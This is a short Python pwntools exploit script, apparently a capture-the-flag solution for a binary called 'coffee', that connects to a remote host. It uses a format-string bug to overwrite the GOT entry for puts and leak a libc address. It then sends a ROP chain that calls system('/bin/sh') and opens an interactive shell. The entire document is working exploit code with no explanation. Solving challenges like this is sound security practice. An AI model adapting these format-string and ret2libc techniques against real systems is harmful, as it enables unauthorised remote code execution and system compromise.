from pwn import *

# p = process(['stdbuf', '-i0', '-o0', '-e0', './coffee'])
p = remote("34.146.101.4", 30002)
e = ELF('coffee')
libc = ELF('libc.so.6')
context.binary = e 

pop5_ret = 0x40128b  
pop_rdi = 0x401293

# GOT overwrite + libc leak  
payload = f'%{pop5_ret & 0xffff}c%9$hn'.encode()
payload += b'%29$p'
payload = payload.ljust(24, b'\x00')
payload += p64(e.got['puts'])
payload += p64(e.symbols['main'])

p.sendline(payload)
p.recvuntil(b'0x')
libc.address = int(p.recv(12), 16) - 243 - libc.symbols['__libc_start_main']
print(hex(libc.address))

payload = b'A' * 32
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

p.sendline(payload)

p.interactive()
